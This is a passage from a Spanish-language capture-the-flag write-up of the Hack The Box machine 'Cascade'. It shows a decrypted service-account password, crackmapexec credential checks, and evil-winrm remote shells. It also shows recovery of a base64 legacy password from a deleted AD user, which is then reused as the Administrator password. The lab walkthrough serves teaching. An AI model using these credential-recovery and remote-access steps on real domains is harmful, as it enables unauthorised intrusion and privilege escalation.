decrypted <span class="o">=</span> aes.decrypt<span class="o">(</span>b64decode<span class="o">(</span><span class="s1">'BQO5l5Kj9MdErXx6Q6AGOw=='</span><span class="o">))</span>
print<span class="o">(</span>decrypted.decode<span class="o">())</span>
</code></pre></div></div>

<p>Procedemos a usar el script en python una vez seteamos el valor de <code class="language-plaintext highlighter-rouge">key</code> y <code class="language-plaintext highlighter-rouge">La Password encontrada en Decrypted</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python3 Decode_Pass.py                                                                                                 1 ⚙</span>

w3lc0meFr31nd
</code></pre></div></div>

<p>Ya tendriamos la contraseña del usuario <code class="language-plaintext highlighter-rouge">ArkSvc</code>, procedemos a validarla con <code class="language-plaintext highlighter-rouge">Crackmapexec</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># crackmapexec smb 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                                                                                                                                           1 ⚙</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\a</span>rksvc:w3lc0meFr31nd 
                                                                                                                                                                      <span class="c"># crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                                                                                                                                         1 ⚙</span>
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span>
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\a</span>rksvc:w3lc0meFr31nd <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<p>Procedemos a intentar conectarnos como el usuario <code class="language-plaintext highlighter-rouge">ArkSvc</code> con <code class="language-plaintext highlighter-rouge">evil-winrm.rb</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># evil-winrm.rb -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                         1 ⚙</span>

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; 
</code></pre></div></div>

<p>Enumeramos los privilegios para el usuario</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc&gt; <span class="nb">whoami</span> /all

USER INFORMATION
<span class="nt">----------------</span>

User Name      SID
<span class="o">==============</span> <span class="o">==============================================</span>
cascade<span class="se">\a</span>rksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
<span class="nt">-----------------</span>

Group Name                                  Type             SID                                            Attributes
<span class="o">===========================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">===============================================================</span>
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE<span class="se">\D</span>ata Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE<span class="se">\I</span>T                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE<span class="se">\A</span>D Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE<span class="se">\R</span>emote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY<span class="se">\N</span>TLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="se">\M</span>edium Plus Mandatory Level Label            S-1-16-8448
</code></pre></div></div>

<p>Enumeramos los Grupos a los que pertenece el usuario <code class="language-plaintext highlighter-rouge">ArkSvc</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
Users comment
Country code                 000 <span class="o">(</span>System Default<span class="o">)</span>
Account active               Yes
Account expires              Never

Password last <span class="nb">set            </span>1/9/2020 4:18:20 PM
Password expires             Never
Password changeable          1/9/2020 4:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 9:05:40 PM

Logon hours allowed          All

Local Group Memberships      <span class="s2">"*AD Recycle Bin"</span>       <span class="s2">"*IT"</span>
                             <span class="s2">"*Remote Management Use"</span>
Global Group memberships     <span class="s2">"*Domain Users"</span>
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<p>Vemos que pertenecemos al Grupo <code class="language-plaintext highlighter-rouge">AD Recycle Bin</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; Get-ADObject <span class="nt">-ldapfilter</span> <span class="s2">"(&amp;(isDeleted=TRUE))"</span> <span class="nt">-IncludeDeletedObjects</span>


Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 51de9801-3625-4ac2-a605-d6bd71617681

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>CASC-WS1<span class="se">\0</span>ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Scheduled Tasks<span class="se">\0</span>ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Machine<span class="se">\0</span>ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>User<span class="se">\0</span>ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
</code></pre></div></div>

<p>Procedemos a buscar por el Name <code class="language-plaintext highlighter-rouge">Temp Admin</code> que como nos decian habia tenido temporamente una password = a la del Administrador</p>

<p>Procedemos a intentar listar todo el Contenido anterior y sus Propiedades con el siguiente Comando en PowerShell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; Get-ADObject <span class="nt">-ldapfilter</span> <span class="s2">"(&amp;(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))"</span> <span class="nt">-IncludeDeletedObjects</span> <span class="nt">-Properties</span> <span class="k">*</span>


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
<span class="s2">"cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz"</span>
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM<span class="o">}</span>
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">OU</span><span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
</code></pre></div></div>

<p>Procedemos a decodear la password</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"YmFDVDNyMWFOMDBkbGVz"</span> | <span class="nb">base64</span> <span class="nt">-d</span> 

<span class="s2">"baCT3r1aN00dles"</span>
</code></pre></div></div>

<p>Probamos con Crackmapexec a hacer validar para que usuario perneceria esta password</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># crackmapexec smb 10.10.10.182 -u users -p baCT3r1aN00dles                                                                             </span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\a</span>dministrator:baCT3r1aN00dles <span class="s2">"(Pwn3d!)"</span>
</code></pre></div></div>

<p>Procedemos a conectarnos con Evil WinRM y sacar la Flag de Root.txt</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># evil-winrm.rb -i 10.10.10.182 -u administrator -p baCT3r1aN00dles                                                 </span>

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../Desktop
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-ar---</span>        1/25/2022   8:53 AM             34 root.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
XXXXXXXXXXb5ab6469c8baea4d5xxxxx
</code></pre></div></div>

<p>Maquina Cascade - AD Path - Rooteada =) Seguimos H4ck</p>


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'http://localhost:4000/2022/01/10/Cascade-AD.html';
     this.page.identifier = '/2022/01/10/Cascade-AD';
     this.page.title = 'Maquina Retirada Cascade AD de Hack The Box (Necesario VIP)';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//bitbrain-github-io.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2022/06/27/Trick.html">
            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/06/15/Attacktive-Directory.html">
            Maquina Retirada Search de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/06/05/Search-AD.html">
            Maquina Retirada Search de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a 